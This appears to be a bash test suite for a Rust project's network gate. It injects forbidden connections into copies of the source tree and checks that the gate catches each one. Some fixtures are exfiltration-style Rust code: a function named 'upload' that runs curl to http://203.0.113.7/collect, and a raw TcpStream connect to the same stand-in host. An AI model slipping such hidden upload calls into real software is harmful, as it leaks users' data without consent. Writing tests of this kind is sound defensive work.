#!/bin/bash
# The network gate must catch every way the Linux server could open a
# connection, not only the obvious spelling. Each case below injects one into
# a copy of the tree and expects check-network-surface.sh to fail; a clean
# copy and an innocent comment must pass.
#
# cargo is replaced by a stub, so this needs neither the network nor a build.

set -euo pipefail

REPOSITORY_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
TEMP_DIRECTORY="$(mktemp -d)"
trap 'rm -rf "$TEMP_DIRECTORY"' EXIT

fail_test() {
  printf 'FAIL: %s\n' "$1" >&2
  exit 1
}

STUBS="$TEMP_DIRECTORY/stubs"
mkdir -p "$STUBS"
cat > "$STUBS/cargo" <<'EOF'
#!/bin/sh
# cargo tree for the gate: nothing networked, or a failure when asked to
[ -n "${CARGO_STUB_FAILS:-}" ] && { echo "error: failed to load the manifest" >&2; exit 101; }
exit 0
EOF
chmod +x "$STUBS/cargo"

# A fresh copy of what the gate reads.
copy() {
  local tree="$TEMP_DIRECTORY/tree"
  rm -rf "$tree"
  mkdir -p "$tree/scripts" "$tree/apps/macos" "$tree/apps/desktop/src-tauri"
  cp "$REPOSITORY_ROOT/scripts/check-network-surface.sh" "$tree/scripts/"
  cp "$REPOSITORY_ROOT/apps/macos/project.yml" "$tree/apps/macos/"
  cp "$REPOSITORY_ROOT/Cargo.toml" "$REPOSITORY_ROOT/Cargo.lock" "$tree/"
  cp -R "$REPOSITORY_ROOT/core" "$tree/core"
  cp -R "$REPOSITORY_ROOT/apps/desktop/src-tauri/src" "$tree/apps/desktop/src-tauri/src"
  mkdir -p "$tree/apps/cli"
  cp "$REPOSITORY_ROOT/apps/cli/Cargo.toml" "$tree/apps/cli/"
  cp -R "$REPOSITORY_ROOT/apps/cli/src" "$tree/apps/cli/src"
  echo "$tree"
}

gate() {
  PATH="$STUBS:/usr/bin:/bin" "$1/scripts/check-network-surface.sh" > "$TEMP_DIRECTORY/gate.out" 2>&1
}

expect_pass() {
  gate "$1" || { cat "$TEMP_DIRECTORY/gate.out" >&2; fail_test "$2"; }
}

expect_fail() {
  if gate "$1"; then
    fail_test "$2"
  fi
}

tree=$(copy)
expect_pass "$tree" "the gate fails on the clean tree"

tree=$(copy)
printf '\n// a TcpStream named in prose is not a connection\n' >> "$tree/apps/cli/src/serve.rs"
expect_pass "$tree" "a comment naming a socket failed the gate"

# a code line that starts with `*` is code, not a block comment
tree=$(copy)
cat >> "$tree/apps/cli/src/serve.rs" <<'EOF'

pub fn probe(slot: &mut Option<std::io::Result<Box<dyn std::any::Any>>>) {
    *slot = Some(std::net::TcpStream::connect("203.0.113.7:80").map(|s| Box::new(s) as _));
}
EOF
expect_fail "$tree" "a connect on a line starting with * passed"

tree=$(copy)
sed -i.bak 's/^\[dependencies\]$/[dependencies]\nminreq = "2"/' "$tree/apps/cli/Cargo.toml"
expect_fail "$tree" "an HTTP client crate the denylist does not name passed"

tree=$(copy)
printf '\n[dependencies.ureq-but-renamed]\nversion = "2"\n' >> "$tree/apps/cli/Cargo.toml"
expect_fail "$tree" "a dependency in table form passed"

tree=$(copy)
sed -i.bak 's/^\[dependencies\]$/[dependencies]\nlibc.workspace = true/' "$tree/apps/cli/Cargo.toml"
expect_fail "$tree" "a workspace dependency passed"

tree=$(copy)
sed -i.bak '/^#!\[forbid(unsafe_code)\]$/d' "$tree/apps/cli/src/lib.rs"
expect_fail "$tree" "the library without forbid(unsafe_code) passed, so a raw socket could be opened"

tree=$(copy)
sed -i.bak '/^#!\[forbid(unsafe_code)\]$/d' "$tree/apps/cli/src/main.rs"
expect_fail "$tree" "the binary without forbid(unsafe_code) passed"

tree=$(copy)
cat >> "$tree/apps/cli/src/serve.rs" <<'EOF'

use std::process::Command as Program;
pub fn upload() {
    let _ = Program::new("curl").arg("http://203.0.113.7/collect").status();
}
EOF
expect_fail "$tree" "an aliased Command passed"

tree=$(copy)
cat >> "$tree/apps/cli/src/decode.rs" <<'EOF'

pub fn fetch() {
    let _ = Command::new("curl").status();
}
EOF
expect_fail "$tree" "decode.rs starting a program other than ffmpeg passed"

tree=$(copy)
expect_pass "$tree" "the clean tree fails with cargo available"
if CARGO_STUB_FAILS=1 gate "$tree"; then
  fail_test "a failing cargo tree passed as if it had found nothing"
fi

echo "network gate: every injected connection was caught"
